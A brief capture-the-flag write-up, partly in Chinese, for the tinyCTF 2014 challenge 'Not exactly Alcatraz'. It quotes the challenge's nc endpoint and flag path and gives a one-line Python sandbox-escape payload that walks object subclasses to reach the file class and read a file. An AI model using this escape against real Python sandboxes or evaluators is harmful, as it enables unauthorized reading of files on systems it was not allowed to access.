# tinyCTF 2014 - Notes

## Not exactly Alcatraz
> Description
>
> Exploit this Over here: nc 54.69.118.120 6000 Flag is in /home/pybaby/flag.txt

這題直接給一個 python code ，然後要可以讀檔，且她過濾的東西很少

要直接讀檔可以用
```
$ ().__class__.__bases__[0].__subclasses__()[40]("./flag").read()
```

